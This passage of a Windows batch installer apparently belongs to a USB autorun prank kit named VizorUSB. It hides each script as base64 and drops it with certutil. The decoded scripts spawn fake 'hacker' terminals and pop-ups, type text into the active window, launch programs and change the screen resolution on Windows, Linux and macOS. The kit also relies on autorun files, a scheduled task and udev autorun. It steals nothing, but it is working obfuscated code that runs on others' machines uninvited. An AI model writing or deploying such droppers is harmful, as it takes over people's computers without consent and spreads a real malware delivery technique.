del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/vanish.vbs ----
if not exist "%T%\scripts" mkdir "%T%\scripts" 2>nul
> "%TEMP%\vz.b64" (
  echo JyBWaXpvclVTQi1OOiDQv9C70LDQvdC+0LLQsNGPINC30LDRh9C40YHRgtC60LAgKHNjaHRhc2tz
  echo LCB+MS0yINC00L3RjykuCicg0JXRgdC70Lgg0YTQu9C10YjQutCwINC90LAg0LzQtdGB0YLQtSAt
  echo INGC0LjRhdC+INGD0LTQsNC70Y/QtdGCINCw0LLRgtC+0LfQsNC/0YPRgdC6LCDQv9C+0YLQvtC8
  echo INGD0LTQsNC70Y/QtdGCINC30LDQtNCw0YfRgy4KT24gRXJyb3IgUmVzdW1lIE5leHQKU2V0IGZz
  echo ID0gQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpCkZvciBFYWNoIGQg
  echo SW4gZnMuRHJpdmVzCiAgICBJZiBkLklzUmVhZHkgVGhlbgogICAgICAgIHAgPSBkLkRyaXZlTGV0
  echo dGVyICYgIjpcLnZpem9yX2RsIgogICAgICAgIElmIGZzLkZpbGVFeGlzdHMocCkgVGhlbgogICAg
  echo ICAgICAgICBmcy5EZWxldGVGaWxlIGQuRHJpdmVMZXR0ZXIgJiAiOgd1dG9ydW4uaW5mIiwgVHJ1
  echo ZQogICAgICAgICAgICBmcy5EZWxldGVGaWxlIGQuRHJpdmVMZXR0ZXIgJiAiOgd1dG9ydW4udmJz
  echo IiwgVHJ1ZQogICAgICAgICAgICBmcy5EZWxldGVGaWxlIGQuRHJpdmVMZXR0ZXIgJiAiOlxzdGFy
  echo dC5iYXQiLCBUcnVlCiAgICAgICAgICAgIGZzLkRlbGV0ZUZpbGUgZC5Ecml2ZUxldHRlciAmICI6
  echo XHN0YXJ0LnNoIiwgVHJ1ZQogICAgICAgICAgICBmcy5EZWxldGVGaWxlIHAsIFRydWUKICAgICAg
  echo ICBFbmQgSWYKICAgIEVuZCBJZgpOZXh0CkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1
  echo biAic2NodGFza3MgL2RlbGV0ZSAvdG4gIiJWaXpvclVTQi1OIiIgL2YiLCAwLCBUcnVlCldTY3Jp
  echo cHQuUXVpdCAwCg==
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\vanish.vbs" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/hack_linux.sh ----
if not exist "%T%\scripts" mkdir "%T%\scripts" 2>nul
> "%TEMP%\vz.b64" (
  echo IyEvYmluL2Jhc2gKIyDQntGC0LrRgNGL0LLQsNC10YIg0L7QutC90LAgSDRDSy1SMDBUINC90LAg
  echo TGludXgg0LggbWFjT1MKQkFTRT0iJDEiClNDUkVFTj0iJEJBU0Uvc2NyaXB0cy9oYWNrX3NjcmVl
  echo bi5zaCIKY2htb2QgK3ggIiRTQ1JFRU4iIDI+L2Rldi9udWxsCgojIEFuZHJvaWQgKFRlcm11eCk6
  echo INCy0YvQstC+0LTQuNC8INC80LDRgtGA0LjRhtGDINC/0YDRj9C80L4g0LIg0YLQtdGA0LzQuNC9
  echo 0LDQuwppZiBbIC1uICIkUFJFRklYIiBdIHx8IFsgIiQodW5hbWUgLW8gMj4vZGV2L251bGwpIiA9
  echo ICJBbmRyb2lkIiBdOyB0aGVuCiAgICBiYXNoICIkU0NSRUVOIgogICAgZXhpdCAwCmZpCgojIG1h
  echo Y09TOiDQvtGC0LrRgNGL0LLQsNC10Lwg0L7QutC90LAgVGVybWluYWwuYXBwINGH0LXRgNC10Lcg
  echo b3Nhc2NyaXB0CmlmIFsgIiQodW5hbWUgLXMpIiA9ICJEYXJ3aW4iIF07IHRoZW4KICAgIGZvciBp
  echo IGluIDEgMiAzIDQgNTsgZG8KICAgICAgICBvc2FzY3JpcHQgLWUgInRlbGwgYXBwbGljYXRpb24g
  echo XCJUZXJtaW5hbFwiIHRvIGRvIHNjcmlwdCBcIkg0Q0tGTDRTSD0xIGJhc2ggJyRTQ1JFRU4nXCIi
  echo ID4vZGV2L251bGwgMj4mMQogICAgICAgIHNsZWVwIDAuNQogICAgZG9uZQogICAgZXhpdCAwCmZp
  echo CgpsYXVuY2goKSB7CiAgICBpZiBjb21tYW5kIC12IGdub21lLXRlcm1pbmFsICY+L2Rldi9udWxs
  echo OyB0aGVuCiAgICAgICAgZ25vbWUtdGVybWluYWwgLS0gYmFzaCAtYyAiSDRDS0ZMNFNIPTEgYmFz
  echo aCAnJFNDUkVFTiciICYKICAgIGVsaWYgY29tbWFuZCAtdiB4dGVybSAmPi9kZXYvbnVsbDsgdGhl
  echo bgogICAgICAgIHh0ZXJtIC1iZyBibGFjayAtZmcgZ3JlZW4gLXRpdGxlICdINENLLVIwMFQnIC1l
  echo IGJhc2ggLWMgIkg0Q0tGTDRTSD0xIGJhc2ggJyRTQ1JFRU4nIiAmCiAgICBlbGlmIGNvbW1hbmQg
  echo LXYgeGZjZTQtdGVybWluYWwgJj4vZGV2L251bGw7IHRoZW4KICAgICAgICB4ZmNlNC10ZXJtaW5h
  echo bCAtLXRpdGxlICdINENLLVIwMFQnIC1lICJiYXNoIC1jICdINENLRkw0U0g9MSBiYXNoIFwiJFND
  echo UkVFTlwiJyIgJgogICAgZWxpZiBjb21tYW5kIC12IGtvbnNvbGUgJj4vZGV2L251bGw7IHRoZW4K
  echo ICAgICAgICBrb25zb2xlIC1lIGJhc2ggLWMgIkg0Q0tGTDRTSD0xIGJhc2ggJyRTQ1JFRU4nIiAm
  echo CiAgICBlbGlmIGNvbW1hbmQgLXYgbWF0ZS10ZXJtaW5hbCAmPi9kZXYvbnVsbDsgdGhlbgogICAg
  echo ICAgIG1hdGUtdGVybWluYWwgLWUgImJhc2ggLWMgJ0g0Q0tGTDRTSD0xIGJhc2ggXCIkU0NSRUVO
  echo XCInIiAmCiAgICBmaQp9CmZvciBpIGluIDEgMiAzIDQgNTsgZG8gbGF1bmNoOyBzbGVlcCAwLjY7
  echo IGRvbmUKZXhpdCAwCg==
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\hack_linux.sh" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/watchdog.sh ----
if not exist "%T%\scripts" mkdir "%T%\scripts" 2>nul
> "%TEMP%\vz.b64" (
  echo IyEvYmluL2Jhc2gKIyDQldGB0LvQuCDRhNC70LXRiNC60YMg0LLRi9C90YPQu9C4IC0+INC30LDQ
  echo utGA0YvRgtGMINC+0LrQvdCwIGg0Y2sg0Lgg0LLQtdGA0L3Rg9GC0Ywg0YDQsNC30YDQtdGI0LXQ
  echo vdC40LUuCiMg0KDQtdGB0YLQvtGAINC00LXQu9Cw0LXRgtGB0Y8g0JjQlyDQn9CQ0JzQr9Ci0Jgg
  echo KC90bXApLCDRgi7Qui4g0YTQu9C10YjQutCwINGD0LbQtSDRgNCw0LfQvNC+0L3RgtC40YDQvtCy
  echo 0LDQvdCwLgpCQVNFPSIkMSIKCm1vdW50ZWQoKSB7IG1vdW50IDI+L2Rldi9udWxsIHwgZ3JlcCAt
  echo cXMgIiAkQkFTRSAiOyB9Cm1vdW50ZWQgfHwgZXhpdCAwCndoaWxlIG1vdW50ZWQ7IGRvIHNsZWVw
  echo IDE7IGRvbmUKCnBraWxsIC1mIEg0Q0tGTDRTSCAyPi9kZXYvbnVsbApzbGVlcCAwLjUKCmlmIFsg
  echo LWYgL3RtcC92aXpvcl9yZXMudHh0IF07IHRoZW4KICAgIElGUz0nfCcgcmVhZCAtciBWWl9PVVQg
  echo VlpfQ1VSIDwgL3RtcC92aXpvcl9yZXMudHh0CiAgICBpZiBbIC1uICIkVlpfT1VUIiBdICYmIGNv
  echo bW1hbmQgLXYgeHJhbmRyID4vZGV2L251bGw7IHRoZW4KICAgICAgICB4cmFuZHIgLS1vdXRwdXQg
  echo IiRWWl9PVVQiIC0tbW9kZSAiJFZaX0NVUiIgLS1zY2FsZSAxeDEgMj4vZGV2L251bGwKICAgIGZp
  echo CiAgICBybSAtZiAvdG1wL3Zpem9yX3Jlcy50eHQKZmkKCmV4aXQgMAo=
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\watchdog.sh" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/shared/common.bat ----
if not exist "%T%\scripts\shared" mkdir "%T%\scripts\shared" 2>nul
> "%TEMP%\vz.b64" (
  echo QGVjaG8gb2ZmCmVjaG8gPT09IENvbW1vbiAoc2hhcmVkKSA9PT0KZWNobyBsb2FkZWQgb24gJU9T
  echo JQo=
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\shared\common.bat" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/shared/common.sh ----
if not exist "%T%\scripts\shared" mkdir "%T%\scripts\shared" 2>nul
> "%TEMP%\vz.b64" (
  echo IyEvYmluL2Jhc2gKZWNobyAiPT09IENvbW1vbiAoc2hhcmVkKSA9PT0iCmVjaG8gIlskKGRhdGUg
  echo JyslWS0lbS0lZCAlSDolTTolUycpXSBjb21tb24uc2ggbG9hZGVkIG9uICQodW5hbWUgLXMpIgo=
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\shared\common.sh" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/linux/01_prank.sh ----
if not exist "%T%\scripts\linux" mkdir "%T%\scripts\linux" 2>nul
> "%TEMP%\vz.b64" (
  echo IyEvYmluL2Jhc2gKQkFTRT0iJChjZCAiJChkaXJuYW1lICIke0JBU0hfU09VUkNFWzBdfSIpLy4u
  echo Ly4uIiAmJiBwd2QpIgppZiBbIC1mICIkQkFTRS9PRkYiIF07IHRoZW4gZXhpdCAwOyBmaQpjbGVh
  echo cgplY2hvICJQUkFOSyBNT0RFIHwg0JDQutGC0LjQstC10L0iCmVjaG8gLWUgIlxlWzMybSIKZm9y
  echo IGkgaW4gJChzZXEgMSAyNSk7IGRvIHByaW50ZiAnMHglMDRYICVzXG4nICQoKFJBTkRPTSAlIDY1
  echo NTM2KSkgIiQob2QgLUFuIC1OMiAtdHgxIC9kZXYvdXJhbmRvbSAyPi9kZXYvbnVsbCB8IHRyIC1k
  echo ICcgJykiOyBzbGVlcCAwLjA1OyBkb25lCmVjaG8gLWUgIlxlWzBtIgppZiBjb21tYW5kIC12IHpl
  echo bml0eSAmPi9kZXYvbnVsbDsgdGhlbgogICAgY2FzZSAkKChSQU5ET00gJSAzKSkgaW4KICAgICAg
  echo ICAwKSAoemVuaXR5IC0td2FybmluZyAtLXdpZHRoPTMwMCAtLXRleHQ9ItCe0LHQvdCw0YDRg9C2
  echo 0LXQvdCwINGH0YDQtdC30LzQtdGA0L3QsNGPINGF0LDRgNC40LfQvNCwINC/0L7Qu9GM0LfQvtCy
  echo 0LDRgtC10LvRjyEiICYpIDs7CiAgICAgICAgMSkgKHplbml0eSAtLWluZm8gLS13aWR0aD0zMDAg
  echo LS10ZXh0PSLQpNC70LXRiNC60LAg0LfQvdCw0LXRgiDRgtCy0L7QuCDRgdC10LrRgNC10YLRiyIg
  echo JikgOzsKICAgICAgICAyKSAoemVuaXR5IC0td2FybmluZyAtLXRleHQ9IkxpbnV4INC/0L7QtNC+
  echo 0LfRgNC10LLQsNC10YIsINGH0YLQviDRgtGLINC70Y7QsdC40YjRjCBjYXRzIiAmKSA7OwogICAg
  echo ZXNhYwpmaQppZiBjb21tYW5kIC12IHRlcm11eC10b2FzdCAmPi9kZXYvbnVsbDsgdGhlbgogICAg
  echo Y2FzZSAkKChSQU5ET00gJSAzKSkgaW4KICAgICAgICAwKSB0ZXJtdXgtdG9hc3QgItCe0LHQvdCw
  echo 0YDRg9C20LXQvdCwINGH0YDQtdC30LzQtdGA0L3QsNGPINGF0LDRgNC40LfQvNCwINC/0L7Qu9GM
  echo 0LfQvtCy0LDRgtC10LvRjyEiIDs7CiAgICAgICAgMSkgdGVybXV4LXRvYXN0ICLQpNC70LXRiNC6
  echo 0LAg0LfQvdCw0LXRgiDRgtCy0L7QuCDRgdC10LrRgNC10YLRiyIgOzsKICAgICAgICAyKSB0ZXJt
  echo dXgtdG9hc3QgItCe0LHQvdCw0YDRg9C20LXQvSDRgdC80LXQvdC90YvQuSDQvdC+0YHQuNGC0LXQ
  echo u9GMIiA7OwogICAgZXNhYwpmaQpleGl0IDAK
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\linux\01_prank.sh" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/linux/03_resrestore.sh ----
if not exist "%T%\scripts\linux" mkdir "%T%\scripts\linux" 2>nul
> "%TEMP%\vz.b64" (
  echo IyEvYmluL2Jhc2gKU1RBVEVfRklMRT0vdG1wL3Zpem9yX3Jlcy50eHQKY29tbWFuZCAtdiB4cmFu
  echo ZHIgPi9kZXYvbnVsbCB8fCBleGl0IDAKWyAtZiAiJFNUQVRFX0ZJTEUiIF0gfHwgZXhpdCAwCklG
  echo Uz0nfCcgcmVhZCAtciBPVVQgQ1VSIDwgIiRTVEFURV9GSUxFIgpbIC1uICIkT1VUIiBdICYmIFsg
  echo LW4gIiRDVVIiIF0gJiYgeHJhbmRyIC0tb3V0cHV0ICIkT1VUIiAtLW1vZGUgIiRDVVIiIC0tc2Nh
  echo bGUgMXgxIDI+L2Rldi9udWxsCnJtIC1mICIkU1RBVEVfRklMRSIKZXhpdCAwCg==
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\linux\03_resrestore.sh" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/linux/02_reschange.sh ----
if not exist "%T%\scripts\linux" mkdir "%T%\scripts\linux" 2>nul
> "%TEMP%\vz.b64" (
  echo IyEvYmluL2Jhc2gKIyDQodC80LXQvdCwINGA0LDQt9GA0LXRiNC10L3QuNGPINC/0L4g0LvQvtCz
  echo 0LjQutC1INC60LDRgNGC0Ysg0LfQsNGF0LLQsNGC0LAgKExpbnV4L21hY09TKQojINCd0LAgbWFj
  echo ICjQvdC10YIgeHJhbmRyKSDQv9GA0L7RgdGC0L4g0LzQvtC70YfQsCDQstGL0YXQvtC00LjRgi4K
  echo VEFSR0VUX1JFUz0iJHtUQVJHRVRfUkVTOi04MDB4NjAwfSIKU1RBVEVfRklMRT0vdG1wL3Zpem9y
  echo X3Jlcy50eHQKY29tbWFuZCAtdiB4cmFuZHIgPi9kZXYvbnVsbCB8fCBleGl0IDAKWyAtbiAiJERJ
  echo U1BMQVkiIF0gfHwgZXhpdCAwCk9VVD0kKHhyYW5kciAtLXF1ZXJ5IDI+L2Rldi9udWxsIHwgYXdr
  echo ICcvIGNvbm5lY3RlZC97cHJpbnQgJDE7IGV4aXR9JykKQ1VSPSQoeHJhbmRyIC0tcXVlcnkgMj4v
  echo ZGV2L251bGwgfCBhd2sgJy9cKi97cHJpbnQgJDE7IGV4aXR9JykKWyAtbiAiJE9VVCIgXSAmJiBb
  echo IC1uICIkQ1VSIiBdIHx8IGV4aXQgMAppZiBbICEgLWYgIiRTVEFURV9GSUxFIiBdOyB0aGVuCiAg
  echo ICBlY2hvICIkT1VUfCRDVVIiID4gIiRTVEFURV9GSUxFIgpmaQppZiAhIHhyYW5kciAtLW91dHB1
  echo dCAiJE9VVCIgLS1tb2RlICIkVEFSR0VUX1JFUyIgMj4vZGV2L251bGw7IHRoZW4KICAgIHhyYW5k
  echo ciAtLW91dHB1dCAiJE9VVCIgLS1zY2FsZSAwLjV4MC41IC0tbW9kZSAiJENVUiIgMj4vZGV2L251
  echo bGwKZmkKZXhpdCAwCg==
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\linux\02_reschange.sh" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/windows/02_reschange.bat ----
if not exist "%T%\scripts\windows" mkdir "%T%\scripts\windows" 2>nul
> "%TEMP%\vz.b64" (
  echo QGVjaG8gb2ZmCnNldCBUQVJHRVRfVz04MDAKc2V0IFRBUkdFVF9IPTYwMApwb3dlcnNoZWxsIC1O
  echo b1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiV+ZHAwcmVzX2NoYW5nZS5w
  echo czEiICVUQVJHRVRfVyUgJVRBUkdFVF9IJQpleGl0IC9iIDAK
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\windows\02_reschange.bat" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/windows/01_prank.bat ----
if not exist "%T%\scripts\windows" mkdir "%T%\scripts\windows" 2>nul
> "%TEMP%\vz.b64" (
  echo QGVjaG8gb2ZmCnNldGxvY2FsIGVuYWJsZWRlbGF5ZWRleHBhbnNpb24KaWYgZXhpc3QgIiV+ZHAw
  echo Li5cLi5cT0ZGIiBleGl0IC9iIDAKZWNobyBQUkFOSyBNT0RFIF58IEFjdGl2ZQpzdGFydCAiIiBj
  echo bWQgL2sgImNvbG9yIDBBICYgdGl0bGUgSDRDS0VEICYgZWNobyBQUk9DRVNTSU5HLi4uICYgZm9y
  echo IC9sICUlaSBpbiAoMSwxLDE1KSBkbyBAZWNobyAweCFyYW5kb20hICUlaSAmJiBwaW5nIC1uIDIg
  echo MTI3LjAuMC4xID5udWwiCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtQ29tbWFuZCAiU3RhcnQtU2xl
  echo ZXAgLU1pbGxpc2Vjb25kcyA1MDA7ICR3cz1OZXctT2JqZWN0IC1Db21PYmplY3QgV1NjcmlwdC5T
  echo aGVsbDsgMS4uM3xGb3JFYWNoLU9iamVjdHsgJHdzLlNlbmRLZXlzKCdQUklWRVQgR0xBVk5ZSSBH
  echo RVJPSSEgJyk7IFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMzAwIH07IGV4aXQiID5udWwgMj4m
  echo MQpzZXQgL2EgTj0lcmFuZG9tJSAlJSAyICsgMQppZiAiJU4lIj09IjEiIHN0YXJ0ICIiIGNhbGMu
  echo ZXhlCmVuZGxvY2FsCg==
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\windows\01_prank.bat" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/windows/res_restore.ps1 ----
if not exist "%T%\scripts\windows" mkdir "%T%\scripts\windows" 2>nul
> "%TEMP%\vz.b64" (
  echo QWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uIEAnCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlJ1
  echo bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwpuYW1lc3BhY2UgV0FQSSB7CiAgW1N0cnVjdExheW91dChM
  echo YXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQ9Q2hhclNldC5BbnNpKV0KICBwdWJsaWMgc3Ry
  echo dWN0IERFVk1PREUgewogICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsVFN0ciwgU2l6
  echo ZUNvbnN0PTMyKV0gcHVibGljIHN0cmluZyBkbURldmljZU5hbWU7CiAgICBwdWJsaWMgc2hvcnQg
  echo ZG1TcGVjVmVyc2lvbjsgcHVibGljIHNob3J0IGRtRHJpdmVyVmVyc2lvbjsgcHVibGljIHNob3J0
  echo IGRtU2l6ZTsKICAgIHB1YmxpYyBzaG9ydCBkbURyaXZlckV4dHJhOyBwdWJsaWMgaW50IGRtRmll
  echo bGRzOyBwdWJsaWMgaW50IGRtUG9zaXRpb25YOyBwdWJsaWMgaW50IGRtUG9zaXRpb25ZOwogICAg
  echo cHVibGljIGludCBkbURpc3BsYXlPcmllbnRhdGlvbjsgcHVibGljIGludCBkbURpc3BsYXlGaXhl
  echo ZE91dHB1dDsgcHVibGljIHNob3J0IGRtQ29sb3I7CiAgICBwdWJsaWMgc2hvcnQgZG1EdXBsZXg7
  echo IHB1YmxpYyBzaG9ydCBkbVlSZXNvbHV0aW9uOyBwdWJsaWMgc2hvcnQgZG1UVE9wdGlvbjsgcHVi
  echo bGljIHNob3J0IGRtQ29sbGF0ZTsKICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbFRT
  echo dHIsIFNpemVDb25zdD0zMildIHB1YmxpYyBzdHJpbmcgZG1Gb3JtTmFtZTsKICAgIHB1YmxpYyBz
  echo aG9ydCBkbUxvZ1BpeGVsczsgcHVibGljIGludCBkbUJpdHNQZXJQZWw7IHB1YmxpYyBpbnQgZG1Q
  echo ZWxzV2lkdGg7IHB1YmxpYyBpbnQgZG1QZWxzSGVpZ2h0OwogICAgcHVibGljIGludCBkbURpc3Bs
  echo YXlGbGFnczsgcHVibGljIGludCBkbURpc3BsYXlGcmVxdWVuY3k7IHB1YmxpYyBpbnQgZG1JQ01N
  echo ZXRob2Q7IHB1YmxpYyBpbnQgZG1JQ01JbnRlbnQ7CiAgICBwdWJsaWMgaW50IGRtTWVkaWFUeXBl
  echo OyBwdWJsaWMgaW50IGRtRGl0aGVyVHlwZTsgcHVibGljIGludCBkbVJlc2VydmVkMTsgcHVibGlj
  echo IGludCBkbVJlc2VydmVkMjsKICAgIHB1YmxpYyBpbnQgZG1QYW5uaW5nV2lkdGg7IHB1YmxpYyBp
  echo bnQgZG1QYW5uaW5nSGVpZ2h0OwogIH0KICBwdWJsaWMgY2xhc3MgVSB7CiAgICBbRGxsSW1wb3J0
  echo KCJ1c2VyMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkFuc2kpXSBwdWJsaWMgc3RhdGljIGV4dGVy
  echo biBib29sIEVudW1EaXNwbGF5U2V0dGluZ3Moc3RyaW5nIGRldiwgaW50IG1vZGUsIHJlZiBERVZN
  echo T0RFIGRtKTsKICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuQW5z
  echo aSldIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBDaGFuZ2VEaXNwbGF5U2V0dGluZ3MocmVmIERF
  echo Vk1PREUgZG0sIGludCBmbGFncyk7CiAgfQp9CidACiRzYXZlRmlsZSA9ICIkZW52OlRFTVBcdml6
  echo b3JfcmVzLnR4dCIKaWYgKC1ub3QgKFRlc3QtUGF0aCAkc2F2ZUZpbGUpKSB7IGV4aXQgfQokbGlu
  echo ZSA9IEdldC1Db250ZW50ICRzYXZlRmlsZSB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEKaWYgKC1u
  echo b3QgJGxpbmUpIHsgZXhpdCB9CiRwID0gJGxpbmUuU3BsaXQoJzsnKTsgaWYgKCRwLkxlbmd0aCAt
  echo bHQgMikgeyBleGl0IH0KJGRtID0gTmV3LU9iamVjdCBXQVBJLkRFVk1PREUKJGRtLmRtU2l6ZSA9
  echo IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbdHlwZV1b
  echo V0FQSS5ERVZNT0RFXSkKW1dBUEkuVV06OkVudW1EaXNwbGF5U2V0dGluZ3MoJG51bGwsIC0xLCBb
  echo cmVmXSRkbSkgfCBPdXQtTnVsbAokZG0uZG1QZWxzV2lkdGggPSBbaW50XSRwWzBdOyAkZG0uZG1Q
  echo ZWxzSGVpZ2h0ID0gW2ludF0kcFsxXQppZiAoJHAuTGVuZ3RoIC1ndCAyKSB7ICRkbS5kbURpc3Bs
  echo YXlGcmVxdWVuY3kgPSBbaW50XSRwWzJdIH0KW1dBUEkuVV06OkNoYW5nZURpc3BsYXlTZXR0aW5n
  echo cyhbcmVmXSRkbSwgMCkgfCBPdXQtTnVsbApSZW1vdmUtSXRlbSAkc2F2ZUZpbGUgLUVycm9yQWN0
  echo aW9uIFNpbGVudGx5Q29udGludWUK
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\windows\res_restore.ps1" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/windows/res_change.ps1 ----
if not exist "%T%\scripts\windows" mkdir "%T%\scripts\windows" 2>nul
> "%TEMP%\vz.b64" (
  echo cGFyYW0oW2ludF0kVywgW2ludF0kSCkKQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uIEAnCnVzaW5n
  echo IFN5c3RlbTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwpuYW1lc3BhY2Ug
  echo V0FQSSB7CiAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQ9Q2hh
  echo clNldC5BbnNpKV0KICBwdWJsaWMgc3RydWN0IERFVk1PREUgewogICAgW01hcnNoYWxBcyhVbm1h
  echo bmFnZWRUeXBlLkJ5VmFsVFN0ciwgU2l6ZUNvbnN0PTMyKV0gcHVibGljIHN0cmluZyBkbURldmlj
  echo ZU5hbWU7CiAgICBwdWJsaWMgc2hvcnQgZG1TcGVjVmVyc2lvbjsgcHVibGljIHNob3J0IGRtRHJp
  echo dmVyVmVyc2lvbjsgcHVibGljIHNob3J0IGRtU2l6ZTsKICAgIHB1YmxpYyBzaG9ydCBkbURyaXZl
  echo ckV4dHJhOyBwdWJsaWMgaW50IGRtRmllbGRzOyBwdWJsaWMgaW50IGRtUG9zaXRpb25YOyBwdWJs
  echo aWMgaW50IGRtUG9zaXRpb25ZOwogICAgcHVibGljIGludCBkbURpc3BsYXlPcmllbnRhdGlvbjsg
  echo cHVibGljIGludCBkbURpc3BsYXlGaXhlZE91dHB1dDsgcHVibGljIHNob3J0IGRtQ29sb3I7CiAg
  echo ICBwdWJsaWMgc2hvcnQgZG1EdXBsZXg7IHB1YmxpYyBzaG9ydCBkbVlSZXNvbHV0aW9uOyBwdWJs
  echo aWMgc2hvcnQgZG1UVE9wdGlvbjsgcHVibGljIHNob3J0IGRtQ29sbGF0ZTsKICAgIFtNYXJzaGFs
  echo QXMoVW5tYW5hZ2VkVHlwZS5CeVZhbFRTdHIsIFNpemVDb25zdD0zMildIHB1YmxpYyBzdHJpbmcg
  echo ZG1Gb3JtTmFtZTsKICAgIHB1YmxpYyBzaG9ydCBkbUxvZ1BpeGVsczsgcHVibGljIGludCBkbUJp
  echo dHNQZXJQZWw7IHB1YmxpYyBpbnQgZG1QZWxzV2lkdGg7IHB1YmxpYyBpbnQgZG1QZWxzSGVpZ2h0
  echo OwogICAgcHVibGljIGludCBkbURpc3BsYXlGbGFnczsgcHVibGljIGludCBkbURpc3BsYXlGcmVx
  echo dWVuY3k7IHB1YmxpYyBpbnQgZG1JQ01NZXRob2Q7IHB1YmxpYyBpbnQgZG1JQ01JbnRlbnQ7CiAg
  echo ICBwdWJsaWMgaW50IGRtTWVkaWFUeXBlOyBwdWJsaWMgaW50IGRtRGl0aGVyVHlwZTsgcHVibGlj
  echo IGludCBkbVJlc2VydmVkMTsgcHVibGljIGludCBkbVJlc2VydmVkMjsKICAgIHB1YmxpYyBpbnQg
  echo ZG1QYW5uaW5nV2lkdGg7IHB1YmxpYyBpbnQgZG1QYW5uaW5nSGVpZ2h0OwogIH0KICBwdWJsaWMg
  echo Y2xhc3MgVSB7CiAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkFu
  echo c2kpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIEVudW1EaXNwbGF5U2V0dGluZ3Moc3RyaW5n
  echo IGRldiwgaW50IG1vZGUsIHJlZiBERVZNT0RFIGRtKTsKICAgIFtEbGxJbXBvcnQoInVzZXIzMi5k
  echo bGwiLCBDaGFyU2V0PUNoYXJTZXQuQW5zaSldIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBDaGFu
  echo Z2VEaXNwbGF5U2V0dGluZ3MocmVmIERFVk1PREUgZG0sIGludCBmbGFncyk7CiAgfQp9CidACiRk
  echo bSA9IE5ldy1PYmplY3QgV0FQSS5ERVZNT0RFCiRkbS5kbVNpemUgPSBbU3lzdGVtLlJ1bnRpbWUu
  echo SW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW3R5cGVdW1dBUEkuREVWTU9ERV0pCltX
  echo QVBJLlVdOjpFbnVtRGlzcGxheVNldHRpbmdzKCRudWxsLCAtMSwgW3JlZl0kZG0pIHwgT3V0LU51
  echo bGwKaWYgKC1ub3QgKFRlc3QtUGF0aCAiJGVudjpURU1QXHZpem9yX3Jlcy50eHQiKSkgewogICAg
  echo IiQoJGRtLmRtUGVsc1dpZHRoKTskKCRkbS5kbVBlbHNIZWlnaHQpOyQoJGRtLmRtRGlzcGxheUZy
  echo ZXF1ZW5jeSkiIHwgT3V0LUZpbGUgIiRlbnY6VEVNUFx2aXpvcl9yZXMudHh0IiAtRW5jb2Rpbmcg
  echo YXNjaWkKfQokZG0uZG1QZWxzV2lkdGggPSAkVwokZG0uZG1QZWxzSGVpZ2h0ID0gJEgKW1dBUEku
  echo VV06OkNoYW5nZURpc3BsYXlTZXR0aW5ncyhbcmVmXSRkbSwgMCkgfCBPdXQtTnVsbAo=
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\windows\res_change.ps1" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- install/linux-autorun.sh ----
if not exist "%T%\install" mkdir "%T%\install" 2>nul
> "%TEMP%\vz.b64" (
  echo IyEvYmluL2Jhc2gKIyDQndCw0YHRgtGA0L7QudC60LAg0LDQstGC0L7Qt9Cw0L/Rg9GB0LrQsCDQ
  echo vdCwIExpbnV4ICh1ZGV2KSAtINC+0LTQuNC9INGA0LDQtyDRgSBzdWRvCmlmIFsgIiQoaWQgLXUp
